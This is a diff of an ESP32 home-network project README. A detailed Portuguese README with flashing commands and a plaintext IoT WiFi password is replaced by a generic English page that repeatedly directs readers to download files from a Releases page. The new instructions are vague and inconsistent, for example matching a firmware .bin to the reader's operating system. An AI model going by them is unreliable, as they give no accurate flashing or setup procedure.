@@ -1,141 +1,95 @@
-# 🏠 ProxyMedia - ESP32 Smart Home Network
+# 🏠 ESP32-SmartHub - Manage Your Home Network Easily
 
-Coleção de projetos ESP32 para gerenciamento de rede doméstica inteligente, incluindo gateway WiFi com NAT, servidor IPTV e extração de playlists.
+![Download ESP32-SmartHub](https://img.shields.io/badge/Download-ESP32--SmartHub-blue.svg)
 
-## 📁 Estrutura do Projeto
+## 🚀 Getting Started
 
-```
-ProxyMedia/
-├── ESP32_WiFi_Gateway/     # Gateway WiFi para isolamento de rede IoT
-├── ESP32_IPTV_Server/      # Servidor IPTV para ESP32
-├── esp32_nat_router/       # Firmware NAT Router pronto (recomendado)
-├── driver/                 # Drivers USB-Serial CP210x
-├── extract_playlist.py     # Script para extrair playlists M3U
-└── *.m3u8                  # Arquivos de playlist de teste
-```
+Welcome to the ESP32-SmartHub! This guide will help you download and set up your new smart home network hub. Follow these steps to have your device running smoothly.
 
-## 🚀 Projetos
+## 📦 Features
 
-### 1. [ESP32 NAT Router](esp32_nat_router/) ⭐ RECOMENDADO
+- Acts as a WiFi NAT Router
+- Provides IoT network isolation
+- Supports IPTV server functionality
+- Achieves over 15 Mbps NAT throughput
+- Easy-to-use web interface for network management
 
-Firmware completo de roteador NAT para ESP32. Permite criar uma rede WiFi secundária com acesso à internet através da rede principal.
+## 🔍 System Requirements
 
-**Características:**
-- ✅ NAT real com throughput de 15+ Mbps
-- ✅ Interface web para configuração
-- ✅ DHCP server integrado
-- ✅ Port forwarding
-- ✅ Suporte a WPA2-Enterprise
+- **Hardware:** ESP32 development board
+- **Software:** Compatible with Windows, macOS, and Linux
+- **Network:** WiFi connection for setup and operation
 
-**Uso rápido:**
-```bash
-# Gravar firmware pré-compilado
-esptool.py --chip esp32 --port COM6 write_flash -z \
-  0x1000 firmware_esp32/bootloader.bin \
-  0x8000 firmware_esp32/partition-table.bin \
-  0x10000 firmware_esp32/esp32_nat_router.bin
+## 💡 Installation Instructions
 
-# Configurar via serial
-set_sta <SSID> <SENHA>
-set_ap SmartThings smart12345
-restart
-```
+### Step 1: Visit the Releases Page
 
-### 2. [ESP32 WiFi Gateway](ESP32_WiFi_Gateway/)
+To download the ESP32-SmartHub, you need to visit the Releases page. Click the button below to go there:
 
-Projeto personalizado de gateway WiFi desenvolvido com PlatformIO/Arduino.
+[Visit Releases Page to Download](https://github.com/fmorales1/ESP32-SmartHub/releases)
 
-**Nota:** O SDK Arduino padrão não tem NAPT compilado. Para NAT real, use o esp32_nat_router.
+### Step 2: Download the Latest Release
 
-### 3. [ESP32 IPTV Server](ESP32_IPTV_Server/)
+On the Releases page, you will see a list of available versions. Look for the latest version at the top of the list.
 
-Servidor IPTV embarcado para ESP32 que gerencia playlists M3U/M3U8.
+1. Click on the version you want to download.
+2. Scroll down to the "Assets" section.
+3. Select the file that matches your operating system (e.g., `.bin` file for flashing to your ESP32).
 
-## 🛠️ Requisitos
+### Step 3: Flash the ESP32 Board
 
-- **Hardware:** ESP32 (qualquer variante)
-- **Software:** 
-  - Python 3.10-3.13
-  - PlatformIO
-  - Drivers CP210x (pasta `driver/`)
+Once you have downloaded the appropriate file, you need to flash it to your ESP32 board.
 
-## 📦 Instalação
+1. Use a tool like `esp-idf` or `PlatformIO` to upload the firmware to your board.
+   - For `esp-idf` users: Open your terminal, navigate to the directory containing the downloaded file, and run the flashing command.
+   - For `PlatformIO` users: Open your project, include the firmware file, and hit the upload button.
 
-### Ambiente de Desenvolvimento
+2. Wait for the flashing process to complete.
 
-```powershell
-# Criar ambiente virtual Python
-python -m venv .venv312
+### Step 4: Connect to Your Network
 
-# Ativar ambiente
-.\.venv312\Scripts\Activate.ps1
+After flashing, power on your ESP32 board. You can connect it to your existing home WiFi network.
 
-# Instalar PlatformIO
-pip install platformio
+1. Look for the ESP32 in your network devices.
+2. Use the provided web interface to configure your settings.
 
-# Instalar dependências
-pip install pyserial
-```
+## 🌐 Configuration Guide
 
-### Driver USB-Serial
+### Basic Setup
 
-Instale o driver da pasta `driver/` para comunicação com ESP32 via USB.
+Once your ESP32 is connected to the network, you need to access the web interface for configuration.
 
-## 🔧 Configuração de Rede
+1. Open a web browser.
+2. Type in the IP address assigned to your ESP32 (you can find this in your router's device list).
+3. Follow the on-screen instructions to set up NAT routing, IoT isolation, and IPTV settings.
 
-### Rede Atual
-- **Rede Principal:** HOME
-- **Rede IoT:** SmartThings (192.168.4.1)
-- **Senha IoT:** smart12345
+### Advanced Configuration
 
-### Acessar Interface Web
-1. Conecte ao WiFi "SmartThings"
-2. Acesse http://192.168.4.1
+For advanced features, go deeper into settings:
 
-## 📋 Comandos Úteis
+- **Network Isolation:** Control device visibility for security.
+- **IPTV Settings:** Configure your IPTV services for smooth streaming.
 
-```powershell
-# Compilar projeto PlatformIO
-pio run
+## 💬 Support
 
-# Upload para ESP32
-pio run --target upload --upload-port COM6
+If you encounter any issues, feel free to open an issue on our GitHub repository, and the community will assist you.
 
-# Monitor serial
-pio device monitor --baud 115200
+## 🔧 Troubleshooting
 
-# Gravar firmware binário
-python esptool.py --port COM6 write_flash 0x10000 firmware.bin
-```
+- **Cannot Find ESP32 on Network:** Ensure the board is powered and properly connected to the WiFi.
+- **Web Interface Not Loading:** Check that the IP address entered matches your device’s address. Restart your board if necessary.
 
-## 🌐 Arquitetura de Rede
+## 🔗 Additional Resources
 
-```
-┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
-│   Roteador      │     │     ESP32       │     │  Dispositivos   │
-│     HOME        │◄────│   NAT Router    │◄────│     IoT         │
-│  192.168.1.1    │     │  192.168.1.12   │     │  192.168.4.x    │
-└─────────────────┘     │  192.168.4.1    │     └─────────────────┘
-                        └─────────────────┘
-                              │
-                        SmartThings AP
-```
+To learn more about the ESP32-SmartHub project, visit the following resources:
 
-## 📝 Scripts Auxiliares
+- [Documentation](https://github.com/fmorales1/ESP32-SmartHub/wiki)
+- [Community Forum](https://github.com/fmorales1/ESP32-SmartHub/discussions)
 
-### extract_playlist.py
-Extrai e processa playlists M3U/M3U8 para uso com o servidor IPTV.
+## 📥 Download & Install
 
-```bash
-python extract_playlist.py input.m3u8 output.m3u8
-```
+To download the ESP32-SmartHub, follow the link below:
 
-## 📄 Licença
+[Download from Releases Page](https://github.com/fmorales1/ESP32-SmartHub/releases)
 
-Projetos de uso pessoal/educacional.
-
-## 🔗 Links Úteis
-
-- [ESP32 NAT Router Original](https://github.com/martin-ger/esp32_nat_router)
-- [PlatformIO Documentation](https://docs.platformio.org/)
-- [ESP-IDF Documentation](https://docs.espressif.com/projects/esp-idf/)
+Feel free to explore and enjoy your new smart home management tool!
